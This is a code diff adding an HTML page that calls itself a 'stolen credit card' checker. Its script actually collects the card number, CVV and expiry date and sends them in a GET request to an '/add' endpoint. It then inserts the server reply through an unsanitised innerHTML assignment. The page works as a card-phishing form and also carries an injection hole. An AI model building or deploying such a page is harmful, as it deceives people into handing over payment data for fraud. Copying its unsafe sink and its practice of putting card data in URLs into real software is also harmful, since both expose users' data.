@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Is your credit card stolen?</title>
+</head>
+<body>
+<input type=number id="number" placeholder="number"/>
+<input type="number"  id="cvv" placeholder="cvv"/>
+<input type="text"  id="expidate" placeholder="MM/YY"/>
+<input type="button" value="Check credit card" onclick="addNewCard()" />
+<div id="XMLresponse">Is your credit card stolen?</div>
+<script>
+    var connection = new XMLHttpRequest();
+
+    function addNewCard(){
+        var cardnumber = document.getElementById("number").value;
+        var cvv = document.getElementById("cvv").value;
+        var exipdate = document.getElementById("expidate").value;
+        connection.open("GET", "/add?cardnumber=" + cardnumber + "&cvv="+ cvv + "&expidate=" + encodeURIComponent(exipdate), true);
+        connection.send(null);
+        connection.onreadystatechange = function(){
+            document.getElementById("XMLresponse").innerHTML = connection.responseText;
+        };
+
+    }
+
+</script>
+
+</body>
+</html>
